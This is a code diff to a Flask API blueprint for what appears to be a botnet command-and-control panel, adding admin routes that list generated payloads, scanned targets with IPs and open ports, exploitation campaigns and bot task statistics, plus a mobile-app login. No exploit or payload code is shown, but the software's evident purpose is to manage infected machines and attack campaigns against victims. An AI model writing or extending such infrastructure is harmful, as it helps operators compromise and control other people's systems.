@@ -6,7 +6,9 @@ import json
 import secrets
 import tempfile
 import threading
-from flask import Blueprint, request, jsonify, send_file
+import os
+from flask import Blueprint, request, jsonify, send_file, session
+from werkzeug.security import check_password_hash
 
 from ..models import (
     db, Admin, Bot, Command, Payload, Target, Campaign, Exploit, Task
@@ -82,10 +84,10 @@ def create_payload():
 
     return jsonify({
         'payload_id': payload.id,
-        'download_url': f"/api/payloads/{payload.id}/download"
+        'download_url': f"/admin/payloads/{payload.id}/download"
     })
 
-@api_bp.route('/api/payloads/<int:payload_id>/download')
+@api_bp.route('/admin/payloads/<int:payload_id>/download')
 def download_payload(payload_id):
     """Download generated payload"""
     if 'admin_logged_in' not in session:
@@ -265,5 +267,112 @@ def get_stats():
     if 'admin_logged_in' not in session:
         return jsonify({'error': 'Unauthorized'}), 401
 
-    stats = server.get_server_stats()
+    # Get basic statistics
+    total_bots = Bot.query.count()
+    active_bots = Bot.query.filter_by(status='active').count()
+    total_targets = Target.query.count()
+    total_campaigns = Campaign.query.count()
+    total_payloads = Payload.query.count()
+    total_tasks = Task.query.count()
+    completed_tasks = Task.query.filter_by(status='completed').count()
+    failed_tasks = Task.query.filter_by(status='failed').count()
+
+    stats = {
+        'total_bots': total_bots,
+        'active_bots': active_bots,
+        'total_targets': total_targets,
+        'total_campaigns': total_campaigns,
+        'total_payloads': total_payloads,
+        'total_tasks': total_tasks,
+        'completed_tasks': completed_tasks,
+        'failed_tasks': failed_tasks,
+        'success_rate': (completed_tasks / total_tasks * 100) if total_tasks > 0 else 0
+    }
+    
     return jsonify(stats)
+
+@api_bp.route('/admin/payloads', methods=['GET'])
+def list_payloads():
+    """List all payloads"""
+    if 'admin_logged_in' not in session:
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    payloads = Payload.query.all()
+    return jsonify([{
+        'id': payload.id,
+        'name': payload.name,
+        'payload_type': payload.payload_type,
+        'platform': payload.platform,
+        'architecture': payload.architecture,
+        'created_at': payload.created_at.isoformat(),
+        'is_active': payload.is_active
+    } for payload in payloads])
+
+@api_bp.route('/admin/targets', methods=['GET'])
+def list_targets():
+    """List all targets"""
+    if 'admin_logged_in' not in session:
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    targets = Target.query.all()
+    return jsonify([{
+        'id': target.id,
+        'ip_address': target.ip_address,
+        'hostname': target.hostname,
+        'os_info': target.os_info,
+        'open_ports': json.loads(target.open_ports) if target.open_ports else [],
+        'status': target.status,
+        'discovered_at': target.discovered_at.isoformat()
+    } for target in targets])
+
+@api_bp.route('/admin/campaigns', methods=['GET'])
+def list_campaigns():
+    """List all campaigns"""
+    if 'admin_logged_in' not in session:
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    campaigns = Campaign.query.all()
+    return jsonify([{
+        'id': campaign.id,
+        'name': campaign.name,
+        'description': campaign.description,
+        'status': campaign.status,
+        'targets_discovered': campaign.targets_discovered,
+        'targets_exploited': campaign.targets_exploited,
+        'success_rate': campaign.success_rate,
+        'created_at': campaign.created_at.isoformat()
+    } for campaign in campaigns])
+
+@api_bp.route('/admin/login', methods=['POST'])
+def api_login():
+    """API login endpoint for mobile app"""
+    data = request.json
+    if not data or 'username' not in data or 'password' not in data:
+        return jsonify({'error': 'Invalid data'}), 400
+
+    username = data['username']
+    password = data['password']
+
+    admin = Admin.query.filter_by(username=username).first()
+    if admin and check_password_hash(admin.password_hash, password):
+        session['admin_logged_in'] = True
+        session['admin_id'] = admin.id
+        
+        # Generate session token for mobile app
+        session_token = secrets.token_urlsafe(32)
+        
+        return jsonify({
+            'success': True,
+            'session_token': session_token,
+            'admin_id': admin.id,
+            'username': admin.username
+        })
+    else:
+        return jsonify({'error': 'Invalid credentials'}), 401
+
+@api_bp.route('/admin/logout', methods=['POST'])
+def api_logout():
+    """API logout endpoint for mobile app"""
+    session.pop('admin_logged_in', None)
+    session.pop('admin_id', None)
+    return jsonify({'success': True, 'message': 'Logged out successfully'})
